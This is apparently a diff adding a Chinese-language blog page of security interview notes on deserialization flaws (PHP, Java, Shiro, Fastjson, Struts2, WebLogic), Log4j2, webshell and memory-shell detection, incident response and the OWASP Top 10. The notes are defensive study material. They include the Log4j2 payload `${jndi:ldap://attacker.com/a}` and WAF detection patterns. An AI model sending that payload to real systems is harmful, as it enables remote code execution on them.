@@ -1,0 +1,497 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="stackTang"/><meta name="copyright" content="stackTang"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="学习,技巧,碎碎念"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="面试 | stackTang Blog"/><meta name="apple-mobile-web-app-title" content="面试 | stackTang Blog"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2026/06/22/面试/"/><meta name="description" content="1. PHP反序列化漏洞成因与原理PHP反序列化漏洞的根本原因在于，应用未对用户输入的序列化字符串进行严格检测，便直接交由unserialize()函数处理。攻击者由此可以控制反序列化过程，结合特定“魔术方法”（如__wakeup()、__destruct()、__toString()等）的自动触发机制，最终导致代码执行、SQL注入等严重后果。 利用方式——POP链（Property Ori...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="面试 | stackTang Blog">
+<meta property="og:url" content="http://example.com/2026/06/22/%E9%9D%A2%E8%AF%95/index.html">
+<meta property="og:site_name" content="stackTang Blog">
+<meta property="og:description" content="1. PHP反序列化漏洞成因与原理PHP反序列化漏洞的根本原因在于，应用未对用户输入的序列化字符串进行严格检测，便直接交由unserialize()函数处理。攻击者由此可以控制反序列化过程，结合特定“魔术方法”（如__wakeup()、__destruct()、__toString()等）的自动触发机制，最终导致代码执行、SQL注入等严重后果。 利用方式——POP链（Property Ori...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/06/22/%E9%9D%A2%E8%AF%95/assets/images/Hexo-Theme-MEOW.png">
+<meta property="article:published_time" content="2026-06-22T12:48:39.000Z">
+<meta property="article:modified_time" content="2026-06-22T13:01:42.116Z">
+<meta property="article:author" content="stackTang">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="技巧">
+<meta property="article:tag" content="碎碎念">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/06/22/%E9%9D%A2%E8%AF%95/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>面试 | stackTang Blog</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/waline.css">
+
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 8.1.2"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>stackTang Blog</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li></ul></div><div class="menu-item"><a href="/friends"><img src="/assets/images/svg/uc/uc-friend.svg" class="icon noview" alt="Icon"><span>friend</span></a></div><div class="menu-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">stackTang Blog</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li></ul></div><div class="menu-aside-item"><a href="/friends"><img src="/assets/images/svg/uc/uc-friend.svg" class="icon noview" alt="Icon"><span>friend</span></a></div><div class="menu-aside-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">StackTang の 站</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">面试</h1><div class="post-author"><span>作者: stackTang</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2026-06-22</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2026-06-22</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a><a class="post-tags-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><a class="post-tags-link" href="/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/" rel="tag">碎碎念</a></span></div></div></div><div class="post markdown" indent="false"><h3 id="1-PHP反序列化漏洞"><a href="#1-PHP反序列化漏洞" class="headerlink" title="1. PHP反序列化漏洞"></a>1. PHP反序列化漏洞</h3><p><strong>成因与原理</strong><br>PHP反序列化漏洞的根本原因在于，应用未对用户输入的序列化字符串进行严格检测，便直接交由<code>unserialize()</code>函数处理。攻击者由此可以控制反序列化过程，结合特定“魔术方法”（如<code>__wakeup()</code>、<code>__destruct()</code>、<code>__toString()</code>等）的自动触发机制，最终导致代码执行、SQL注入等严重后果。</p>
+<p><strong>利用方式——POP链（Property Oriented Programming）</strong><br>攻击者利用PHP中已有的类和方法，通过巧妙地构造和串联对象属性链（POP链）来实现代码注入与执行。其构造思路通常是从一个能自动触发的魔术方法（如<code>__wakeup()</code>或<code>__destruct()</code>）开始，一路串联到能执行命令的敏感函数或方法。</p>
+<p><strong>防御方案</strong>：</p>
+<ul>
+<li><strong>对象白名单验证</strong>：在<code>unserialize()</code>前对对象类型进行严格校验。</li>
+<li><strong>避免直接反序列化用户输入</strong>：优先使用JSON等安全数据格式作为替代。</li>
+<li><strong>升级PHP版本</strong>：利用新版PHP新增的反序列化安全特性。</li>
+<li><strong>代码审计</strong>：重点审查所有存在<code>unserialize()</code>函数的上下文。</li>
+</ul>
+<hr>
+<h3 id="2-Java反序列化漏洞"><a href="#2-Java反序列化漏洞" class="headerlink" title="2. Java反序列化漏洞"></a>2. Java反序列化漏洞</h3><p><strong>基本原理</strong><br>若Java应用对用户（攻击者）可控的输入执行了反序列化处理，攻击者便可通过构造恶意序列化数据，使应用在反序列化时生成非预期的对象，最终实现远程任意代码执行。</p>
+<p><strong>经典利用链</strong>：</p>
+<ul>
+<li><strong>Apache Commons Collections</strong>：利用<code>InvokerTransformer</code>等类进行反射调用，是ysoserial工具中最经典的一条利用链。</li>
+<li><strong>其他常见链</strong>：包括CommonsBeanutils、Spring、JDK7u21等，它们大多利用<code>Runtime.exec()</code>或<code>ProcessBuilder</code>来执行系统命令。</li>
+</ul>
+<p><strong>防御方案</strong>：</p>
+<ul>
+<li><strong>避免反序列化不可信数据</strong>：这是最根本的解决方案，应优先考虑。</li>
+<li><strong>使用安全的替代方案</strong>：将序列化&#x2F;反序列化方式从Java原生序列化转为JSON、Protobuf等跨语言格式。</li>
+<li><strong>类白名单过滤</strong>：使用Java 9及以上版本引入的<code>ObjectInputFilter</code>，严格限制允许被反序列化的类。</li>
+<li><strong>升级JDK与组件</strong>：启用JEP 290等内置安全机制，并持续关注厂商发布的安全补丁。</li>
+</ul>
+<hr>
+<h3 id="3-Java框架安全风险概述"><a href="#3-Java框架安全风险概述" class="headerlink" title="3. Java框架安全风险概述"></a>3. Java框架安全风险概述</h3><p><strong>总体风险面</strong>：Java生态常用的Web框架和组件，由于底层大量依赖序列化、动态代理和表达式解析等技术，在这些环节极易出现高危风险。常见漏洞类型包括反序列化漏洞、表达式注入（EL&#x2F;OGNL&#x2F;SPEL）和JNDI注入。</p>
+<p><strong>通用防护思路</strong>：</p>
+<ul>
+<li><strong>纵深防御</strong>：在框架、应用、网络层面构建多级防御体系，避免任何单一防御机制失效导致整体沦陷。</li>
+<li><strong>最小权限原则</strong>：运行应用的服务账户严格遵循最小权限，限制命令执行后的破坏范围。</li>
+<li><strong>持续监控与更新</strong>：建立持续的第三方组件安全监控机制，确保能第一时间升级修复。</li>
+<li><strong>RASP（运行时应用自我保护）</strong>：在线上环境部署RASP或内存马检测探针，实时拦截攻击。</li>
+</ul>
+<hr>
+<h3 id="4-Apache-Shiro反序列化漏洞（Shiro-550与Shiro-721）"><a href="#4-Apache-Shiro反序列化漏洞（Shiro-550与Shiro-721）" class="headerlink" title="4. Apache Shiro反序列化漏洞（Shiro-550与Shiro-721）"></a>4. Apache Shiro反序列化漏洞（Shiro-550与Shiro-721）</h3><p><strong>Shiro-550原理</strong><br>对应CVE-2016-4437，影响版本Apache Shiro &lt;&#x3D; 1.2.4。漏洞根源在于Shiro的“RememberMe”功能，其AES加密密钥被硬编码在源码中。攻击流程为：命令 -&gt; 序列化 -&gt; AES加密 -&gt; base64编码 -&gt; 植入Cookie的<code>rememberMe</code>字段，服务端收到该Cookie后，按相反步骤解密并反序列化，导致任意代码执行。</p>
+<p><strong>Shiro-721原理</strong><br>利用了Padding Oracle攻击。这是一种更高级的加密学攻击，需要先获取目标用户一个合法的RememberMe Cookie。攻击者通过分析服务端响应差异（解密成功与否的反馈），不断地构造和发送精心设计的密文，最终可在未知密钥的情况下，构造出能通过解密并被恶意执行的Payload。</p>
+<p><strong>区别总结</strong>：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>Shiro-550</th>
+<th>Shiro-721</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前提条件</td>
+<td>无需认证，仅需服务端使用默认密钥</td>
+<td>需要获取一个合法的RememberMe Cookie</td>
+</tr>
+<tr>
+<td>攻击方式</td>
+<td>直接生成恶意Payload</td>
+<td>利用Padding Oracle攻击分步构造Payload</td>
+</tr>
+<tr>
+<td>核心成因</td>
+<td>AES密钥硬编码</td>
+<td>AES-CBC模式下存在Padding Oracle漏洞</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>&lt;&#x3D; 1.2.4</td>
+<td>&lt; 1.4.2</td>
+</tr>
+</tbody></table></div>
+<p><strong>防御方案</strong>：</p>
+<ul>
+<li><strong>升级Shiro版本至1.4.2以上</strong>：升级后框架将为每个应用随机生成唯一密钥。</li>
+<li><strong>替换默认密钥</strong>：确保<code>rememberMe</code>的AES密钥为高强度且唯一的随机字符串。</li>
+<li><strong>使用<code>GCM</code>模式</strong>：将加密模式从<code>CBC</code>改为带有完整性校验功能的<code>GCM</code>模式。</li>
+</ul>
+<hr>
+<h3 id="5-Fastjson反序列化漏洞"><a href="#5-Fastjson反序列化漏洞" class="headerlink" title="5. Fastjson反序列化漏洞"></a>5. Fastjson反序列化漏洞</h3><p><strong>原理与利用</strong><br>漏洞源于Fastjson的<code>AutoType</code>（自动类型）功能。此特性允许在反序列化的JSON数据中，通过<code>@type</code>字段来指定要反序列化的具体Java类。由于早期版本未对<code>@type</code>字段进行严格过滤，攻击者可以传入恶意类（如<code>com.sun.rowset.JdbcRowSetImpl</code>）并结合JNDI注入，实现远程代码执行。</p>
+<p><strong>各版本绕过与防御措施</strong>：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Fastjson版本</th>
+<th>绕过方式与挑战</th>
+<th>防御机制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt; 1.2.25</td>
+<td>直接利用</td>
+<td>无</td>
+</tr>
+<tr>
+<td>1.2.25 ~ 1.2.41</td>
+<td>禁用默认<code>AutoType</code>，并引入黑名单机制，但没有白名单</td>
+<td>类名使用<code>L...</code>和<code>;</code>绕过</td>
+</tr>
+<tr>
+<td>1.2.42 ~ 1.2.67</td>
+<td>黑名单被不断修补，但攻击者持续挖掘新的gadget类进行绕过</td>
+<td>使用<code>expectClass</code>字段实现初步白名单</td>
+</tr>
+<tr>
+<td>1.2.68</td>
+<td>引入<code>safeMode</code>开关，开启后完全禁止<code>AutoType</code></td>
+<td><code>safeMode</code>开启后直接抛出异常</td>
+</tr>
+</tbody></table></div>
+<p><strong>最终方案</strong>：升级最新版本，并在生产环境中开启<code>safeMode</code>以彻底关闭<code>AutoType</code>功能。</p>
+<hr>
+<h3 id="6-Apache-Struts2反序列化与OGNL注入"><a href="#6-Apache-Struts2反序列化与OGNL注入" class="headerlink" title="6. Apache Struts2反序列化与OGNL注入"></a>6. Apache Struts2反序列化与OGNL注入</h3><p><strong>核心机制</strong>：Struts2的对值栈（ValueStack）操作底层依赖OGNL（Object-Graph Navigation Language）表达式语言来存取数据。当用户可控的输入被当作OGNL表达式解析时，就会导致远程代码执行。</p>
+<p><strong>典型案例</strong>：</p>
+<ul>
+<li><strong>S2-012</strong>：框架中对Action对象的重定向参数以OGNL表达式解析，造成了二次解析导致代码执行。</li>
+<li><strong>S2-045 &#x2F; S2-046</strong>：基于Jakarta Multipart parser的文件上传组件，异常处理时错误地注入了用户可控的<code>Content-Type</code>参数，造成OGNL注入。</li>
+<li><strong>S2-052（CVE-2017-9805）</strong>：Struts2的REST插件使用XStream解析XML数据时，未做充分过滤，反序列化攻击者精心构造的XStream恶意对象导致远程代码执行。</li>
+</ul>
+<p><strong>流量特征</strong>：请求体中常见包含OGNL语法片段（<code>%{...}</code>）或<code>java.lang.ProcessBuilder</code>、<code>Runtime</code>等字样的恶意payload。</p>
+<p><strong>防御方案</strong>：</p>
+<ul>
+<li><strong>启动严格模式</strong>：在<code>struts.xml</code>中配置启用OGNL表达式严格模式。</li>
+<li><strong>部署WAF规则</strong>：对包含OGNL语法的参数进行过滤或阻断。</li>
+<li><strong>及时升级</strong>：推送最新安全补丁，特别是修复了表达式解析漏洞的版本。</li>
+</ul>
+<hr>
+<h3 id="7-Spring系列反序列化漏洞"><a href="#7-Spring系列反序列化漏洞" class="headerlink" title="7. Spring系列反序列化漏洞"></a>7. Spring系列反序列化漏洞</h3><p><strong>产生场景</strong>：在Spring生态中，当应用从不可信的源（如远程客户端）反序列化对象时易产生漏洞，例如Spring框架的<code>HttpInvoker</code>或Spring Security的<code>RememberMe</code>功能。攻击者可通过发送恶意序列化流，在服务端执行任意代码。</p>
+<p><strong>典型案例</strong>：</p>
+<ul>
+<li><strong>Spring Cloud Gateway RCE（CVE-2022-22947）</strong>：<code>Actuator</code>端点暴露，攻击者可向Gateway动态添加包含SPEL表达式的恶意路由，进而触发RCE。</li>
+<li><strong>Spring Security RememberMe</strong>：若签名密钥泄露，攻击者可伪造RememberMe Cookie实现持久化后门。</li>
+</ul>
+<p><strong>利用链与防御</strong>：</p>
+<ul>
+<li><strong>利用链</strong>：常利用经典的CommonsCollections、Spring AOP Proxy等链，在无法找到直接利用链的情况下也会尝试其他技术，比如利用<code>JNDI</code>注入、<code>XMLDecoder</code>等。</li>
+<li><strong>防御</strong>：<ul>
+<li><strong>关闭不需要的端口和服务</strong>，如<code>Actuator</code>端点。</li>
+<li><strong>避免使用Java原生序列化</strong>，改用JSON、Protobuf等方案。</li>
+<li>对外部输入进行白名单校验，使用<code>ObjectInputFilter</code>。</li>
+<li>定期审查和升级Spring Boot、Security相关依赖。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="8-WebLogic反序列化漏洞"><a href="#8-WebLogic反序列化漏洞" class="headerlink" title="8. WebLogic反序列化漏洞"></a>8. WebLogic反序列化漏洞</h3><p><strong>漏洞根源</strong>：WebLogic是一个典型的分布式中间件，内部大量利用Java序列化来实现RMI&#x2F;T3&#x2F;IIOP等协议通信。由于攻击面巨大，黑名单不断被补丁和被绕过，导致反序列化漏洞频发。</p>
+<p><strong>典型案例</strong>：</p>
+<ul>
+<li><strong>CVE-2020-2883</strong>：因<code>ReflectionExtractor</code>被加入黑名单而一度被封堵，其后又被CVE-2020-14645绕过。</li>
+<li><strong>CVE-2023-21931</strong>：利用JNDI注入，在反序列化成功后进一步加载远程恶意类。</li>
+</ul>
+<p><strong>后利用与补丁绕过技术</strong>：</p>
+<ul>
+<li><strong>黑名单绕过</strong>：寻找不在当前官方黑名单或未被安全研究人员公开的新gadget类。</li>
+<li><strong>后反序列化（Post-deserialization）利用</strong>：不再直接利用<code>readObject()</code>，而是关注其子流程<code>readResolve()</code>、<code>readExternal()</code>等环节的漏洞。</li>
+</ul>
+<p><strong>防御方案</strong>：</p>
+<ul>
+<li><strong>及时打补丁</strong>：及时安装Oracle官方季度发布的“关键补丁更新（CPU）”。</li>
+<li><strong>最小化暴露面</strong>：若业务无需T3&#x2F;IIOP协议，直接在管理控制台中禁用。</li>
+<li><strong>网络层访问控制</strong>：严格限制能够访问WebLogic控制台和T3端口的IP。</li>
+</ul>
+<hr>
+<h3 id="9-Log4j2漏洞（JNDI注入）"><a href="#9-Log4j2漏洞（JNDI注入）" class="headerlink" title="9. Log4j2漏洞（JNDI注入）"></a>9. Log4j2漏洞（JNDI注入）</h3><p><strong>漏洞本质与原理</strong>：此漏洞准确的名称是<strong>Log4j2的JNDI注入漏洞</strong>（CVE-2021-44228），而非单纯的反序列化漏洞。核心原理是，Log4j2的“Lookup”机制支持<code>${}</code>语法来动态获取环境信息，其中<code>jndi</code>协议可让应用加载远程资源。攻击者无需任何认证，只需向任何存在Log4j2日志记录的系统发起一个包含<code>${jndi:ldap://attacker.com/a}</code>的请求，日志组件就会去加载并实例化攻击者LDAP服务器上的恶意远程类，导致任意代码执行。利用方式极为简单：向目标发送包含上述payload的请求（放在User-Agent、URL等任何参数均可），触发日志记录即可。</p>
+<p><strong>流量检测与防御</strong>：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>检测方法</th>
+<th>具体操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>WAF特征检测</strong></td>
+<td>检测请求中是否出现<code>${jndi:</code>、<code>${jndi:ldap:</code>、<code>${jndi:rmi:</code>等模式</td>
+</tr>
+<tr>
+<td><strong>流量威胁狩猎</strong></td>
+<td>分析DNS日志，监控是否存在对外部的非正常<code>ldap</code>或<code>rmi</code>请求</td>
+</tr>
+<tr>
+<td><strong>HIDS&#x2F;EDR检测</strong></td>
+<td>监控Java进程是否出现异常的外部连接请求</td>
+</tr>
+</tbody></table></div>
+<p><strong>长期防范措施</strong>：</p>
+<ul>
+<li><strong>核心方案</strong>：升级Log4j2版本至2.17.0以上，永久禁用<code>Lookup</code>行为。</li>
+<li><strong>临时方案</strong>：设置<code>log4j2.formatMsgNoLookups=true</code>，或禁用JNDI（<code>spring.jndi.ignore=true</code>）。</li>
+<li><strong>纵深防御</strong>：在出口防火墙上限制不必要的出站LDAP&#x2F;RMI流量。</li>
+</ul>
+<hr>
+<h3 id="10-Webshell流量分析"><a href="#10-Webshell流量分析" class="headerlink" title="10. Webshell流量分析"></a>10. Webshell流量分析</h3><p><strong>核心工具特征对比</strong>：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>Webshell工具</th>
+<th>流量特征</th>
+<th>检测思路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>菜刀（Chopper）</strong></td>
+<td>早期版本明文传输，payload中常出现<code>eval</code>、<code>base64_decode</code>。新版本使用base64加密，但仍有类似<code>z0=GB2312</code>的固定特征</td>
+<td>检查POST包体中是否存在连续的base64字符串，并匹配固定参数名。</td>
+</tr>
+<tr>
+<td><strong>蚁剑（AntSword）</strong></td>
+<td>继承菜刀特征，默认传输加密为一次base64。支持扩展，可通过自定义编码器混淆流量，但默认混淆规则可被识别。</td>
+<td>解码base64后，分析是否存在敏感函数调用，以及User-Agent等辅助特征。</td>
+</tr>
+<tr>
+<td><strong>冰蝎（Behinder）</strong></td>
+<td>采用动态非对称加密。第一阶段请求为明文，返回包中包含16位随机密钥；后续所有通讯均使用此密钥协商的AES加密。</td>
+<td>检测首次密钥协商阶段的<strong>明文请求</strong>，以及后续payload长度固定的<strong>加密数据块</strong>。</td>
+</tr>
+<tr>
+<td><strong>哥斯拉（Godzilla）</strong></td>
+<td>与冰蝎类似，同样采用动态非对称加密，但加密算法和密钥协商细节不同，payload也支持更复杂的自定义编码。</td>
+<td>识别其独特的<code>Cookie</code>格式以及固定长度的加密载荷。</td>
+</tr>
+</tbody></table></div>
+<p><strong>一般分析步骤</strong>：</p>
+<ol>
+<li><strong>提取异常流量</strong>：筛选出访问频率异常、payload加密、或UA头可疑的HTTP请求与响应。</li>
+<li><strong>分析加密&#x2F;编码手段</strong>：判断是否包含base64等编码字符串，或明显的加密载荷。</li>
+<li><strong>识别工具指纹</strong>：匹配已知工具（菜刀、蚁剑、冰蝎、哥斯拉）的流量模式与特征。</li>
+<li><strong>分析连接与行为</strong>：提取出Webshell的URL地址和口令（pass），以及攻击者执行的命令。</li>
+</ol>
+<hr>
+<h3 id="11-内存马分析"><a href="#11-内存马分析" class="headerlink" title="11. 内存马分析"></a>11. 内存马分析</h3><p><strong>工作原理</strong>：<br>内存马是一种完全驻留内存的恶意代码，它绕过传统文件检测，不生成任何物理文件，通过动态修改或添加中间件组件来实现后门。对Java来说，内存马利用了Servlet容器在运行期间动态注册组件的特性。</p>
+<p><strong>常见类型</strong>：</p>
+<ul>
+<li><strong>Filter型</strong>：动态注册一个恶意Filter，拦截、处理或探测所有经过过滤链的请求。</li>
+<li><strong>Servlet型</strong>：动态注册一个恶意Servlet，直接处理特定URL路径的请求。</li>
+<li><strong>Listener型</strong>：利用监听器接口，在会话&#x2F;请求生命周期中触发恶意行为。</li>
+<li><strong>Agent型</strong>：更底层的类型，通过<code>Instrumentation</code> API或JVMTI注入，危害更大。</li>
+</ul>
+<p><strong>检测与清除方法</strong>：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>检测手段</th>
+<th>具体操作说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Agent扫描</strong></td>
+<td>利用Java Agent技术，遍历JVM中所有的Filter、Servlet、Listener映射，查找非代码清单内的恶意模块。</td>
+</tr>
+<tr>
+<td><strong>内存转储（Dump）</strong></td>
+<td>生成JVM的Heap Dump文件，使用Eclipse Memory Analyzer（MAT）等工具离线分析可疑对象及其引用链。</td>
+</tr>
+<tr>
+<td><strong>进程监控</strong></td>
+<td>实时监控Java进程的内存使用、线程活动以及外部网络连接，发现无文件落地但异常活动的进程。</td>
+</tr>
+<tr>
+<td><strong>工具检测</strong></td>
+<td>使用“河马”或各大云平台提供的内存马检测探针，进行在线实时扫描。</td>
+</tr>
+<tr>
+<td><strong>清除</strong></td>
+<td>对于<strong>Filter型</strong>和<strong>Servlet型</strong>，通常通过JMX或反射调用注销恶意组件；对于<strong>Agent型</strong>，一般只能<strong>重启服务</strong>。</td>
+</tr>
+</tbody></table></div>
+<hr>
+<h3 id="12-应急响应与溯源"><a href="#12-应急响应与溯源" class="headerlink" title="12. 应急响应与溯源"></a>12. 应急响应与溯源</h3><p><strong>标准处置流程（PDCERF模型）</strong>：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>关键动作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>1. 准备（Preparation）</strong></td>
+<td>建立应急组织架构，划分角色（指挥、技术、法务、通讯），部署必备的取证工具和系统。</td>
+</tr>
+<tr>
+<td><strong>2. 检测与确认（Detection &amp; Analysis）</strong></td>
+<td>通过安全设备（WAF、IDS、HIDS）和日志分析确定攻击事件，分析攻击范围、影响程度及后门类型。</td>
+</tr>
+<tr>
+<td><strong>3. 遏制（Containment）</strong></td>
+<td>第一时间对失陷主机做<strong>网络隔离（网线&#x2F;防火墙规则）</strong>，但<strong>不断电</strong>以保留内存中的罪证。</td>
+</tr>
+<tr>
+<td><strong>4. 根除与恢复（Eradication &amp; Recovery）</strong></td>
+<td>彻底清除恶意文件、后门和内存马，加固相关漏洞，并从安全备份中恢复业务数据。</td>
+</tr>
+<tr>
+<td><strong>5. 复盘（Post-Incident Activity）</strong></td>
+<td>输出详细的应急响应报告，记录攻击时间线、攻击手法和损失评估，并据此改进防御策略。</td>
+</tr>
+</tbody></table></div>
+<p><strong>攻击路径溯源</strong>：</p>
+<ol>
+<li><strong>日志分析取证</strong>：<ul>
+<li><strong>Web访问日志</strong>：找出可疑的、包含payload的URL请求，回溯攻击入口点。</li>
+<li><strong>登录日志</strong>：检查SSH、RDP等是否存在异常登录（时间、地域）。</li>
+<li><strong>数据库审计日志</strong>：跟踪攻击者是否执行了拖库等操作。</li>
+</ul>
+</li>
+<li><strong>样本与流量关联</strong>：<ul>
+<li>对提取到的恶意样本（Webshell、木马）进行逆向分析，提取C&amp;C（Command and Control）服务器IP和域名。</li>
+<li>将C&amp;C IP关联全流量（NTA）设备，找出内网所有失陷主机。</li>
+</ul>
+</li>
+<li><strong>溯源反制</strong>：<ul>
+<li>在确保合规和法律授权的前提下，通过蜜罐、流量反打等手段，尝试获取攻击者更高层级的身份指纹。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="13-OWASP-Top-10漏洞（原理、攻击、流量特征）"><a href="#13-OWASP-Top-10漏洞（原理、攻击、流量特征）" class="headerlink" title="13. OWASP Top 10漏洞（原理、攻击、流量特征）"></a>13. OWASP Top 10漏洞（原理、攻击、流量特征）</h3><p>针对OWASP Top 10中的重点类别进行梳理：</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>原理与攻击手法</th>
+<th>流量特征</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>注入类</strong>（SQLi、命令注入等）</td>
+<td>应用未验证、转义用户输入，直接拼入解释器（SQL解释器、命令行）执行。</td>
+<td>请求参数中含有SQL语法（<code>&#39; OR &#39;1&#39;=&#39;1</code>）、系统命令（<code>ping</code>、<code>wget</code>）或代码片段。</td>
+</tr>
+<tr>
+<td><strong>失效的访问控制</strong></td>
+<td>未严格检查用户权限，导致越权（IDOR）访问数据或执行操作。</td>
+<td>通过修改POST&#x2F;GET中的用户ID或路径，触发403重放放行或直接获取数据。</td>
+</tr>
+<tr>
+<td><strong>安全配置错误</strong></td>
+<td>使用了默认凭证、暴露了调试接口（如Actuator）或开启了不必要的HTTP方法（TRACE&#x2F;PUT）。</td>
+<td>访问<code>/actuator</code>、<code>/debug</code>等路径返回200，或响应头中暴露服务器版本信息。</td>
+</tr>
+<tr>
+<td><strong>跨站脚本（XSS）</strong></td>
+<td>将用户提交的数据不经验证地渲染到前端，导致可注入恶意JavaScript。</td>
+<td>在请求参数或请求体中检测到<code>&lt;script&gt;</code>、<code>onerror=</code>等HTML标签，或反射型XSS的payload。</td>
+</tr>
+<tr>
+<td><strong>不安全的设计</strong></td>
+<td>系统在架构与设计阶段就缺少必要的安全控制，如未限制登录尝试（可暴力破解）、未加密传输敏感数据。</td>
+<td>登录接口短时间内出现多次连续尝试（暴力破解特征），或流量全程为明文HTTP。</td>
+</tr>
+<tr>
+<td><strong>使用含已知漏洞的组件</strong></td>
+<td>使用了存在已知CVE漏洞的框架、库，如本题中的Fastjson、Log4j2等。</td>
+<td>组件版本号可通过特定URL路径（如<code>/version.txt</code>）或响应头暴露，被攻击者探测。</td>
+</tr>
+</tbody></table></div>
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 stackTang 于 2026-06-22 20:48:39 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2026/06/22/%E9%9D%A2%E8%AF%95/">面试</a></span><button class="copy-text" type="button" data-text="http://example.com/2026/06/22/%E9%9D%A2%E8%AF%95/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>stackTang Blog</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a><a class="post-tail-tags-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><a class="post-tail-tags-link" 